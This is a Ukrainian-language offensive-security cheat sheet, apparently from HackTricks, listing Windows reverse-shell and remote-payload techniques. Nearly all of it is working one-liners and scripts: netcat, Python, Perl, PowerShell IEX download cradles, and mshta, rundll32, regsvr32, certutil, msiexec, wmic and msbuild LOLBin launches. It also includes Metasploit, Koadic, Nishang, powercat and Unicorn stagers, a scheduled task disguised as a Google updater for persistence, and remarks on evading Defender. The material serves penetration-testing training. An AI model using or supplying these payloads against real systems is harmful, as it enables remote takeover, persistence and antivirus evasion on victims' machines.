# Shells - Windows

{{#include ../../banners/hacktricks-training.md}}

## Lolbas

Сторінка [lolbas-project.github.io](https://lolbas-project.github.io/) призначена для Windows, так само як [https://gtfobins.github.io/](https://gtfobins.github.io/) — для Linux.<sup>[[13]](#references)[[14]](#references)</sup>
Windows використовує access tokens і privileges для безпеки процесів, а Windows 11 також містить опційну команду `sudo`.<sup>[[11]](#references)[[12]](#references)</sup> Корисно знати, **як** деякі **binaries** можна (зловмисно) використовувати для виконання неочікуваних дій, таких як **виконання довільного коду**.<sup>[[13]](#references)</sup>

Наведені нижче базові payloads для Windows reverse shell також описані у cheat sheets HighOn.Coffee і PayloadsAllTheThings; адаптуйте шляхи та встановлені interpreters для цілі.<sup>[[1]](#references)[[4]](#references)</sup>

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## NCAT

жертва
```
ncat.exe <Attacker_IP> <PORT>  -e "cmd.exe /c (cmd.exe  2>&1)"
#Encryption to bypass firewall
ncat.exe <Attacker_IP> <PORT eg.443> --ssl -e "cmd.exe /c (cmd.exe  2>&1)"
```
зловмисник
```
ncat -l <PORT>
#Encryption to bypass firewall
ncat -l <PORT eg.443> --ssl
```
## SBD

**[sbd](https://www.kali.org/tools/sbd/) — це портативна та безпечна альтернатива Netcat**. Він працює в Unix-подібних системах і Win32. Завдяки таким функціям, як надійне шифрування, виконання програм, налаштовувані вихідні порти та безперервне повторне підключення, sbd забезпечує універсальне рішення для TCP/IP-комунікацій. Користувачі Windows можуть використовувати версію sbd.exe з дистрибутива Kali Linux як надійну заміну Netcat.<sup>[[15]](#references)</sup>
```bash
# Victims machine
sbd -l -p 4444 -e bash -v -n
listening on port 4444


# Atackers
sbd 10.10.10.10 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
## Python
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Атакуюча сторона (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Жертва
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Процес, що виконує мережевий виклик: **powershell.exe**\
Payload записано на диск: **NO** (_принаймні ніде, де я зміг це знайти за допомогою procmon !_).<sup>[[5]](#references)</sup>
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Процес, що виконує мережевий виклик: **svchost.exe**\
Payload, записаний на диск: **WebDAV client local cache**.<sup>[[5]](#references)</sup>

**Однорядкова команда:**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**Дізнайтеся більше про різні PowerShell Shells наприкінці цього документа**

## Mshta

- [Звідси](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```bash
mshta http://webserver/payload.hta
```

```bash
mshta \\webdavserver\folder\payload.hta
```
#### **Приклад hta-psh reverse shell (використання hta для завантаження та виконання PS backdoor)**
```xml
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Ви можете дуже легко завантажити й виконати Koadic zombie за допомогою stager hta**.<sup>[[3]](#references)</sup>

#### приклад hta

[**Звідси**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f).<sup>[[7]](#references)</sup>
```xml
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

[**Звідси**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17).<sup>[[8]](#references)</sup>
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Виявляється defender**

## **Rundll32**

[**Приклад hello world для DLL**](https://github.com/carterjones/hello-world-dll)

- [Звідси](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
**Виявляється defender**

**Rundll32 - sct**

Повторно використайте scriptlet, показаний у розділі [mshta - sct](#mshta-sct); його початковий коментар містить відповідний launcher `rundll32.exe`.<sup>[[8]](#references)</sup>

#### **Rundll32 - Metasploit**
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

- [Звідси](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
**Виявлено захисником**

#### Regsvr32 – arbitrary DLL export with /i argument (gatekeeping & persistence)

Окрім завантаження remote scriptlets (`scrobj.dll`), `regsvr32.exe` завантажує локальну DLL і викликає її експорти `DllRegisterServer`/`DllUnregisterServer`. Custom loaders часто зловживають цим для виконання довільного коду, маскуючись під підписаний LOLBin. У wild були помічені два tradecraft-прийоми:<sup>[[6]](#references)</sup>

- Gatekeeping argument: DLL завершує роботу, якщо через `/i:<arg>` не передано певний switch, наприклад `/i:--type=renderer`, щоб імітувати дочірні процеси Chromium renderer. Це зменшує ймовірність випадкового виконання та ускладнює роботу sandboxes.
- Persistence: запланувати запуск `regsvr32` для виконання DLL у silent-режимі з високими привілеями та необхідним аргументом `/i`, замаскувавши його під updater task:
```powershell
Register-ScheduledTask \
-Action (New-ScheduledTaskAction -Execute "regsvr32" -Argument "/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\<name>.dll\"") \
-Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)) \
-TaskName 'GoogleUpdaterTaskSystem196.6.2928.90.{FD10B0DF-...}' \
-TaskPath '\\GoogleSystem\\GoogleUpdater' \
-Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -DontStopOnIdleEnd) \
-RunLevel Highest
```

Також див. варіант ClickFix clipboard‑to‑PowerShell, який розміщує JS loader, а згодом забезпечує persistence за допомогою `regsvr32`.<sup>[[6]](#references)</sup>
{{#ref}}
../../generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md
{{#endref}}


[**Звідси**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1).<sup>[[9]](#references)</sup>
```html
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Ви можете дуже легко завантажити та виконати Koadic zombie за допомогою stager regsvr**.<sup>[[3]](#references)</sup>

## Certutil

- [Звідси](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

Завантажте B64dll, декодуйте його та виконайте.<sup>[[5]](#references)</sup>
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Завантажте B64exe, декодуйте його та виконайте.<sup>[[5]](#references)</sup>
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Виявлено Defender**

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Виявлено захисником**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Процес, що виконує мережевий виклик: **svchost.exe**\
Payload записано на диск: **локальний кеш WebDAV client**.<sup>[[5]](#references)</sup>
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Виявлено захисником**

## **MSIExec**

Зловмисник
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Жертва:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Виявлено**

## **Wmic**

- [Звідси](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
```bash
wmic os get /format:"https://webserver/payload.xsl"
```
Приклад xsl-файлу [звідси](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7).<sup>[[10]](#references)</sup>
```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
**Не виявляється**

**Ви можете дуже легко завантажити й виконати Koadic zombie за допомогою stager wmic**.<sup>[[3]](#references)</sup>

## Msbuild

- [Звідси](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Цей проєкт описує MSBuildShell як PowerShell host, який може обходити application whitelisting і обмеження `powershell.exe`, а також надавати shell, подібний до PowerShell.<sup>[[16]](#references)</sup>\
Просто завантажте це та виконайте: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj).<sup>[[16]](#references)</sup>
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**Не виявлено**

## **CSC**

Скомпілювати код C# на машині жертви.<sup>[[17]](#references)[[18]](#references)</sup>
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Ви можете завантажити базовий C# reverse shell тут: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Не виявляється**

## **Regasm/Regsvc**

- [Тут](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
**Я цього не пробував**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182).<sup>[[2]](#references)</sup>

## Odbcconf

- [Звідси](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
```bash
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
**Я не пробував це**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2).<sup>[[2]](#references)</sup>

## Powershell Shells

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

У папці **Shells** є багато різних shell. Щоб завантажити та виконати Invoke-_PowerShellTcp.ps1_, створіть копію скрипту й додайте в кінець файлу:<sup>[[19]](#references)</sup>
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Почніть роздавати скрипт через вебсервер і виконайте його на стороні жертви:<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender не виявляє це як шкідливий код (поки що, 04.03.2019).

**TODO: Перевірити інші Nishang shells**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Завантажте, запустіть web server, запустіть listener і виконайте це на стороні жертви:<sup>[[22]](#references)</sup>
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defender не виявляє це як шкідливий код (поки що, 03.04.2019).

**Інші опції, які пропонує powercat:**

Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files...<sup>[[22]](#references)</sup>
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Створіть powershell launcher, збережіть його у файл, а потім завантажте та виконайте його.<sup>[[23]](#references)[[26]](#references)[[27]](#references)</sup>
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Виявлено як шкідливий код**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Створіть powershell-версію бекдору metasploit за допомогою unicorn.<sup>[[24]](#references)</sup>
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Запустіть msfconsole зі створеним resource:<sup>[[24]](#references)</sup>
```
msfconsole -r unicorn.rc
```
Запустіть вебсервер, який роздає файл _powershell_attack.txt_, і виконайте на машині жертви:<sup>[[24]](#references)</sup>
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Виявлено як шкідливий код**

## Більше

[PS>Attack](https://github.com/jaredhaight/PSAttack) PS console із попередньо завантаженими offensive PS modules (зашифрований)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) PS console із деякими offensive PS modules і виявленням proxy (IEX).<sup>[[25]](#references)</sup>

## References

- [1] [Шпаргалка Reverse Shell: PHP, ASP, Netcat, Bash і Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [GitHub Gists Arno0x](https://gist.github.com/Arno0x)
- [3] [Koadic – COM Command & Control Framework](https://www.hackingarticles.in/koadic-com-command-control-framework/)
- [4] [Шпаргалка Reverse Shell — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [Windows Oneliners для завантаження віддаленого payload і виконання довільного коду](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
- [6] [Дослідження Check Point — Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [7] [calc.hta — приклад reverse execution для HTA (gist Arno0x)](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
- [8] [scriptlet.sct — приклад scriptlet для mshta/rundll32 (gist Arno0x)](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
- [9] [regsvr32.sct — приклад scriptlet для Regsvr32 (gist Arno0x)](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
- [10] [wmic.xsl — приклад таблиці стилів XSL для WMIC (gist Arno0x)](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)
- [11] [Токени доступу — застосунки Win32 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- [12] [Sudo для Windows (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/advanced-settings/sudo/)
- [13] [LOLBAS](https://lolbas-project.github.io/)
- [14] [GTFOBins](https://gtfobins.github.io/)
- [15] [sbd | Інструменти Kali Linux](https://www.kali.org/tools/sbd/)
- [16] [MSBuildShell](https://github.com/Cn33liz/MSBuildShell)
- [17] [Параметри компілятора — правила мовних можливостей (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/language)
- [18] [Параметри компілятора — параметри виведення (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/output)
- [19] [Nishang](https://github.com/samratashok/nishang)
- [20] [Invoke-WebRequest (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1)
- [21] [Invoke-Expression (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5)
- [22] [powercat](https://github.com/besimorhino/powercat)
- [23] [Empire (архівований репозиторій)](https://github.com/EmpireProject/Empire)
- [24] [Unicorn](https://github.com/trustedsec/unicorn)
- [25] [WinPwn](https://github.com/SecureThisShit/WinPwn)
- [26] [Вікі Empire](https://bc-security.gitbook.io/empire-wiki/)
- [27] [multi_generate_agent | Вікі Empire](https://bc-security.gitbook.io/empire-wiki/stagers/multi_generate_agent)
{{#include ../../banners/hacktricks-training.md}}
